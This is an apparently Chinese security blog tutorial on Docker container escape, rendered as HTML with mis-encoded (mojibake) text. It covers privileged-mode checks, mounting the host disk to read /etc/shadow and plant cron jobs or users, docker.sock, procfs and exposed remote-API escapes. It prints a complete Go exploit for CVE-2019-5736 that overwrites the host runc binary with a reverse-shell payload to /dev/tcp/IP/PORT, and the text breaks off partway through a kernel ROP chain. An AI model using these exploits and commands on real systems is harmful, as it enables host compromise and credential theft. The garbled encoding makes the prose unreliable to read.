<h3 id="Docker-å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®"><a href="#Docker-å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®" class="headerlink" title="Docker å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®"></a>Docker å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®</h3><p>å¦‚æœè®¾å®šäº†ä»¥ä¸‹é…ç½®å°±ä¼šå¯¼è‡´ç›¸åº”çš„éš”ç¦»æœºåˆ¶å¤±æ•ˆï¼š</p>
<ul>
<li>â€“privilegedï¼šä½¿å®¹å™¨å†…çš„ root æƒé™å’Œå®¿ä¸»æœºä¸Šçš„ root æƒé™ä¸€è‡´ï¼Œæƒé™éš”ç¦»è¢«æ‰“ç ´</li>
<li>â€“net&#x3D;hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€ç½‘ç»œå‘½åç©ºé—´ï¼Œç½‘ç»œéš”ç¦»è¢«æ‰“ç ´</li>
<li>â€“pid&#x3D;hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€è¿›ç¨‹å‘½ä»¤ç©ºé—´ï¼Œè¿›ç¨‹éš”ç¦»è¢«æ‰“ç ´</li>
<li>â€“volume &#x2F;:&#x2F;hostï¼šå®¿ä¸»æœºæ ¹ç›®å½•è¢«æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ï¼Œæ–‡ä»¶ç³»ç»Ÿéš”ç¦»è¢«æ‰“ç ´</li>
</ul>
<p>å½“æ“ä½œè€…æ‰§è¡Œ<code>docker run --privileged</code>æ—¶ï¼ŒDockerå°†å…è®¸å®¹å™¨è®¿é—®å®¿ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ï¼Œä½¿å®¹å™¨æ‹¥æœ‰ä¸é‚£äº›ç›´æ¥è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹å‡ ä¹ç›¸åŒçš„è®¿é—®æƒé™ã€‚å¯ä»¥é€šè¿‡å†™sshå¯†é’¥ã€è®¡åˆ’ä»»åŠ¡ç­‰æ–¹å¼è¾¾åˆ°é€ƒé€¸ã€‚</p>
<p>åˆ¤æ–­æ˜¯å¦ä¸ºç‰¹æƒæ¨¡å¼ï¼šCapEff ä¸»è¦æ˜¯æ£€æŸ¥çº¿ç¨‹çš„æ‰§è¡Œæƒé™ã€‚å¦‚æœæ˜¯ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„è¯ï¼ŒCapEff å¯¹åº”çš„æ©ç å€¼åº”è¯¥ä¸º0000003fffffffff æˆ–è€…æ˜¯ 0000001fffffffff <a target="_blank" rel="noopener" href="https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html">(1)</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç‰¹æƒçº§ä¸‹</span></span><br><span class="line">bash-4.4<span class="comment"># cat /proc/1/status | grep Cap</span></span><br><span class="line">CapInh: 0000000000000000</span><br><span class="line">CapPrm: 0000003fffffffff</span><br><span class="line">CapEff: 0000003fffffffff</span><br><span class="line">CapBnd: 0000003fffffffff</span><br><span class="line">CapAmb: 0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># éç‰¹æƒçº§ä¸‹</span></span><br><span class="line">root@a8a2a8be5ee4:/<span class="comment"># cat /proc/1/status | grep Cap</span></span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	00000000a80425fb</span><br><span class="line">CapEff:	00000000a80425fb</span><br><span class="line">CapBnd:	00000000a80425fb</span><br><span class="line">CapAmb:	0000000000000000</span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ capsh --decode=0000003fffffffff</span><br><span class="line">0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span><br></pre></td></tr></table></figure>

<p>æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œé€ƒé€¸</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹ç£ç›˜æ–‡ä»¶</span></span><br><span class="line">fdisk -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‚è½½</span></span><br><span class="line"><span class="built_in">mkdir</span> -p hacker</span><br><span class="line">mount /dev/sda1 /hacker</span><br><span class="line"><span class="built_in">cat</span> /hacker/etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šæ—¶ä»»åŠ¡</span></span><br><span class="line">/hacker/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥æ·»åŠ æ–°çš„ç”¨æˆ·è¿›è¡Œç™»å½•</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /mnt</span><br><span class="line"><span class="built_in">chroot</span> /mnt adduser john</span><br></pre></td></tr></table></figure>

<h3 id="Dockerå±é™©æŒ‚è½½"><a href="#Dockerå±é™©æŒ‚è½½" class="headerlink" title="Dockerå±é™©æŒ‚è½½"></a>Dockerå±é™©æŒ‚è½½</h3><h4 id="docker-sock"><a href="#docker-sock" class="headerlink" title="docker.sock"></a>docker.sock</h4><p>docker.sockæ˜¯**Dockerå®ˆæŠ¤è¿›ç¨‹(Docker daemon)<strong>é»˜è®¤ç›‘å¬çš„</strong>UnixåŸŸå¥—æ¥å­—(Unix domain socket)**ï¼Œå®¹å™¨ä¸­çš„è¿›ç¨‹å¯ä»¥é€šè¿‡å®ƒä¸Dockerå®ˆæŠ¤è¿›ç¨‹è¿›è¡Œé€šä¿¡ã€‚</p>
<p>docker.sockæŒ‚è½½</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /var/run/docker.sock:/var/run/docker.sock <span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p>æ£€æµ‹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lah /var/run/docker.sock</span><br></pre></td></tr></table></figure>

<h4 id="æ ¹ç›®å½•"><a href="#æ ¹ç›®å½•" class="headerlink" title="æ ¹ç›®å½•"></a>æ ¹ç›®å½•</h4><p>ç›¸å½“äºç›´æ¥å†™ä¸»æœºçš„æ ¹ç›®å½•äº†</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /mount_dir</span><br></pre></td></tr></table></figure>

<h4 id="procfs"><a href="#procfs" class="headerlink" title="procfs"></a>procfs</h4><p>æŸ¥çœ‹æ˜¯å¦æŒ‚è½½</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name core_pattern</span><br></pre></td></tr></table></figure>

<p>é€ƒé€¸ï¼Œ<a target="_blank" rel="noopener" href="https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html">(2)</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯»æ‰¾åœ¨ä¸»æœºä¸‹çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line"><span class="built_in">cat</span> /proc/mounts | xargs -d <span class="string">&#x27;,&#x27;</span> -n 1 | grep workdir</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥åå¼¹ shell åˆ°ç›®æ ‡çš„ proc ç›®å½•ä¸‹</span></span><br></pre></td></tr></table></figure>

<h3 id="Docker-remote-API"><a href="#Docker-remote-API" class="headerlink" title="Docker remote API"></a>Docker remote API</h3><p>é€šè¿‡å°†å®¿ä¸»æœºçš„dockeræœåŠ¡é€šè¿‡socketçš„æ–¹å¼æš´éœ²ç»™å¤–éƒ¨è¿æ¥ï¼Œä½¿å¾—å…¶ä»–ä¸»æœºä¹Ÿå¯ä»¥è®¿é—®dockeræœåŠ¡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åˆ©ç”¨ remote API æ¥æ“ä½œdockerè¿›è¡Œé€ƒé€¸</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å®¹å™¨</span></span><br><span class="line">curl http://&lt;target&gt;:2375/containers/json</span><br><span class="line">docker -H tcp://&lt;target&gt;:2375 ps -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†è¿œç¨‹çš„æ ¹ç›®å½•æŒ‚è½½</span></span><br><span class="line">docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="ç¨‹åºæ¼æ´å¯¼è‡´Docker-é€ƒé€¸"><a href="#ç¨‹åºæ¼æ´å¯¼è‡´Docker-é€ƒé€¸" class="headerlink" title="ç¨‹åºæ¼æ´å¯¼è‡´Docker é€ƒé€¸"></a>ç¨‹åºæ¼æ´å¯¼è‡´Docker é€ƒé€¸</h3><p>ä½¿ç”¨ <code>docker version</code> å‘½ä»¤å¯ä»¥çœ‹åˆ° <code>runc &amp;&amp; containerd</code> ç»„ä»¶</p>
<h4 id="runc"><a href="#runc" class="headerlink" title="runc"></a>runc</h4><p>runcæ˜¯ä¸€ä¸ªåº•å±‚æœåŠ¡å·¥å…·ï¼ŒrunC ç®¡ç†å®¹å™¨çš„åˆ›å»ºï¼Œè¿è¡Œï¼Œé”€æ¯ç­‰ï¼Œdockeréƒ¨åˆ†ç‰ˆæœ¬æœåŠ¡è¿è¡Œæ—¶åº•å±‚å…¶å®åœ¨è¿è¡Œç€runcæœåŠ¡ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰¹å®šçš„å®¹å™¨é•œåƒæˆ–è€…execæ“ä½œé‡å†™å®¿ä¸»æœºä¸Šçš„runc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶åœ¨å®¿ä¸»æœºä¸Šä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ä¸€ä¸ªå®¹å™¨å¼€å¯æ—¶ï¼Œå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰æ­¥</p>
<ul>
<li>fork åˆ›å»ºå­è¿›ç¨‹</li>
<li>åˆå§‹åŒ–å®¹å™¨åŒ–ç¯å¢ƒ</li>
<li>å°†æ‰§è¡Œæµé‡å®šå‘åˆ°ç”¨æˆ·æä¾›çš„å…¥å£ç‚¹</li>
</ul>
<p><code>docker run</code>ç­‰å‘½ä»¤çš„æ—¶å€™å®é™…ä¸Šåœ¨åº•å±‚è°ƒç”¨çš„æ˜¯runCç¨‹åºï¼Œæˆ‘ä»¬åœ¨å®¹å™¨ä¸­è¿è¡Œ <code>/bin/bash</code> ä¹Ÿä¼šè°ƒç”¨åˆ°runC</p>
<p><img src="https://ts1.cn.mm.bing.net/th/id/R-C.cd098a90bebc7feb12058053becebedc?rik=DLvUCkgJJdKuYg&riu=http://xuxinkun.github.io/img/docker-oci-runc-k8s/kubelet.png&ehk=mGer8iOXT1GplC3OjM4e3sLhuBjr74asYNM3BLOwePA=&risl=&pid=ImgRaw&r=0" alt="runc"></p>
<p>procfs:</p>
<ul>
<li><code>/proc/[PID]/exe</code>: ä¸€ç§ç‰¹æ®Šçš„è½¯è¿æ¥ï¼Œæ˜¯è¯¥è¿›ç¨‹è‡ªèº«å¯¹åº”çš„æœ¬åœ°æ–‡ä»¶</li>
<li><code>/proc/[PID]/fd/</code>: è¿™ä¸ªç›®å½•ä¸‹å­˜æ”¾äº†è¯¥è¿›ç¨‹æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦</li>
</ul>
<p><code>/proc/[PID]/exe</code>çš„ç‰¹æ®Šä¹‹å¤„åœ¨äºå½“æƒé™é€šè¿‡çš„æƒ…å†µä¸‹æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå†…æ ¸å°†ä¼šä¹‹é—´è¿”å›ä¸€ä¸ªæŒ‡å‘è¯¥æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶éæŒ‰ç…§ä¼ ç»Ÿçš„æ‰“å¼€æ–¹å¼åšè·¯å¾„åˆ†æå’Œæ–‡ä»¶æŸ¥æ‰¾ï¼Œè¿™å°±ä¼šå¯¼è‡´ç»•è¿‡äº†mntå‘½åç©ºé—´å’Œchrootçš„é™åˆ¶ã€‚</p>
<p>CVE-2019-5736ï¼šè¯¥æ¼æ´å…è®¸æ”»å‡»è€…é‡å†™å®¿ä¸»æœºä¸Šçš„runc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨å®¿ä¸»æœºä¸Šä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚</p>
<ul>
<li>ä¿®æ”¹å®¹å™¨å†…çš„<code>/bin/sh</code>æ–‡ä»¶ï¼Œæ”¹ä¸º<code>#!/proc/self/exe</code>ï¼Œè¿™æ ·çš„è¯ï¼Œå½“å®¹å™¨å†…çš„<code>/bin/sh</code>è¢«æ‰§è¡Œçš„æ—¶å€™ï¼Œå®é™…ä¸Šè¢«æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„æ˜¯<code>/proc/self/exe</code></li>
<li><code>/proc/self/exe</code>æ˜¯å†…æ ¸ä¸ºæ¯ä¸ªè¿›ç¨‹åˆ›å»ºçš„ç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘<strong>ä¸ºè¯¥è¿›ç¨‹è€Œæ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶</strong>ã€‚å½“å®¹å™¨ä¸­çš„<code>/bin/sh</code>è¢«æ‰§è¡Œæ—¶ï¼Œ<code>/proc/self/exe</code>æŒ‡å‘çš„å®¿ä¸»æœºä¸Šçš„<code>runc</code>å°±ä¼šè¢«æ‰§è¡Œ</li>
</ul>
<p>æ¼æ´çš„å­˜åœ¨åŸç†åœ¨äº&#x2F;proc&#x2F;pid&#x2F;exeè¿™ä¸ªç»‘å®šçš„æ–¹å¼ï¼Œ&#x2F;procæ˜¯æ¯”è¾ƒç†ŸçŸ¥çš„ä¸€ä¸ªæ¦‚å¿µï¼Œä¸ºä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œå…¶ä¸­çš„æ–‡ä»¶èƒ½å¤Ÿæ˜¾ç¤ºå½“å‰çš„è¿›ç¨‹è¿è¡Œä¿¡æ¯ã€‚&#x2F;proc&#x2F;pid&#x2F;exeæ˜¯ä¸€ä¸ªç¨‹åºé“¾æ¥ï¼ŒæŒ‡å‘è¿™ä¸ªpidè¿è¡Œçš„ç¨‹åºã€‚</p>
<p>è€Œè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ–¹å¼å°±åœ¨äºï¼Œåœ¨dockeré‡ŒæŸ¥æ‰¾åˆ°runcçš„exeï¼Œè·å–å¯¹åº”äºè¯¥ä½ç½®çš„ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œç„¶åå‘è¿™ä¸ªä½ç½®å†™å…¥ä¸œè¥¿çš„è¯ï¼Œå°±èƒ½å¤Ÿå°†å®¿ä¸»æœºçš„ç¨‹åºè¦†ç›–æ‰ï¼Œç„¶åç”¨æˆ·ä¸‹ä¸€æ¬¡å†è¦è¿è¡Œruncçš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘åå¼¹shellã€‚</p>
<p>PoC</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line"><span class="comment">// æ›¿æ¢IP å’Œ PORT</span></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp; 1 &amp;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//é¦–å…ˆæ¥çœ‹çœ‹èƒ½ä¸èƒ½æ‰“å¼€/bin/shï¼Œå³æœ‰rootæƒé™å°±æˆ</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ç„¶åå°†å…¶è¦†ç›–ä¸º#!/proc/self/exe</span></span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// å¾ªç¯éå†/procé‡Œçš„æ–‡ä»¶ï¼Œç›´åˆ°æ‰¾åˆ°runcæ˜¯å“ªä¸ªè¿›ç¨‹</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="type">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="type">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// å¾ªç¯å»è¯»è¿™ä¸ª/proc/pid/exeï¼Œå…ˆæ‹¿åˆ°ä¸€ä¸ªè¯¥æ–‡ä»¶çš„fdï¼Œè¯¥fdå°±æŒ‡å‘äº†runcç¨‹åºçš„ä½ç½®</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="type">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ç„¶åä¸æ–­çš„å»å°è¯•å†™è¿™ä¸ªæŒ‡å‘çš„æ–‡ä»¶ï¼Œä¸€å¼€å§‹ç”±äºruncä¼šå…ˆå ç”¨ç€ï¼Œå†™ä¸è¿›å»ï¼Œç›´åˆ°runcçš„å ç”¨è§£é™¤äº†ï¼Œå°±ç«‹å³å†™å…¥</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			writeHandle.Write([]<span class="type">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>CVE-2024-21626ï¼šç”±äºÂ <code>runc</code>Â å†…éƒ¨ä¸æ­£ç¡®å¤„ç†æ–‡ä»¶æè¿°ç¬¦ï¼Œå¯¼è‡´æ³„æ¼å…³é”®çš„å®¿ä¸»æœºæ–‡ä»¶æè¿°ç¬¦åˆ°å®¹å™¨ä¸­ã€‚</p>
<p>è¿‘æ—¥å¤§ç«çš„CVEï¼Œåœ¨ç¿»çœ‹<a target="_blank" rel="noopener" href="https://bestwing.me/CVE-2024-21626-container-escape.html">è¿™ä½å¸ˆå‚…çš„æ–‡ç« </a>æ—¶çœ‹åˆ°çš„</p>
<p><del>çœ‹èµ·æ¥å¾ˆNBï¼Œè™½ç„¶æˆ‘ç°åœ¨çœ‹ä¸æ‡‚ğŸ˜­</del></p>
<h4 id="containerd"><a href="#containerd" class="headerlink" title="containerd"></a>containerd</h4><p>containerd æ˜¯ä¸€ä¸ªå·¥ä¸šçº§æ ‡å‡†çš„å®¹å™¨è¿è¡Œæ—¶ï¼Œå®ƒå¼ºè°ƒ<strong>ç®€å•æ€§</strong>ã€<strong>å¥å£®æ€§</strong>å’Œ<strong>å¯ç§»æ¤æ€§</strong>ï¼Œcontainerd å¯ä»¥è´Ÿè´£å¹²ä¸‹é¢è¿™äº›äº‹æƒ…ï¼š</p>
<ul>
<li>ç®¡ç†å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼ˆä»åˆ›å»ºå®¹å™¨åˆ°é”€æ¯å®¹å™¨ï¼‰</li>
<li>æ‹‰å–&#x2F;æ¨é€å®¹å™¨é•œåƒ</li>
<li>å­˜å‚¨ç®¡ç†ï¼ˆç®¡ç†é•œåƒåŠå®¹å™¨æ•°æ®çš„å­˜å‚¨ï¼‰</li>
<li>è°ƒç”¨ runc è¿è¡Œå®¹å™¨ï¼ˆä¸ runc ç­‰å®¹å™¨è¿è¡Œæ—¶äº¤äº’ï¼‰</li>
<li>ç®¡ç†å®¹å™¨ç½‘ç»œæ¥å£åŠç½‘ç»œ</li>
</ul>
<h3 id="å†…æ ¸æ¼æ´"><a href="#å†…æ ¸æ¼æ´" class="headerlink" title="å†…æ ¸æ¼æ´"></a>å†…æ ¸æ¼æ´</h3><h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>commit_creds(prepare_kernel_cred(0))ä¸ä¼šçªç ´namespaceå¯¹äºè¿›ç¨‹çš„é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´å³ä½¿åœ¨å®Œæˆææƒä¹‹åï¼Œtask_structä¸­çš„fs_structæˆ–è€…æ˜¯ns_proxyéƒ½ä¸å—åˆ°å½±å“è¿˜å¤„äºåŸæœ¬çš„å‘½åç©ºé—´ä¸­ã€‚</p>
<p>å¯ä»¥çœ‹CVE-2021-22555çš„æ¼æ´åˆ©ç”¨ï¼Œåœ¨å¾—åˆ°rootæƒé™åï¼Œéœ€è¦åœ¨å†…æ ¸ä¸­å°†è¿›ç¨‹çš„å‘½åç©ºé—´åˆ‡æ¢ä¸ºåˆå§‹çš„å…¨å±€å‘½åç©ºé—´Â <code>init_nsproxy</code>Â å³å¯å®Œæˆå®¹å™¨é€ƒé€¸ï¼Œæ‰§è¡Œ<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code>Â å³å¯æ›¿æ¢æ‰å½“å‰è¿›ç¨‹çš„å‘½åç©ºé—´</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</span></span><br><span class="line">  *rop++ = kbase_addr + POP_RDI_RET;</span><br><span class="line">  *rop++ = <span class="number">1</span>; <span class="comment">// RDI</span></span><br><span class="line">  *rop++ = kbase_addr + FIND_TASK_BY_VPID;</span><br><span class="line">  *rop++ = kbase_addr + POP_RCX_RET;</span><br><span class="line">  *rop++ = <span class="number">4</span>; <span class="comment">// RCX</span></span><br><span class="line">  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;</span><br><span class="line">  *rop++ = <span class="number">0xDEADBEEF</span>; <span class="comment">// RBP</span></span><br><span class="line">  *rop++ = kbase_addr + 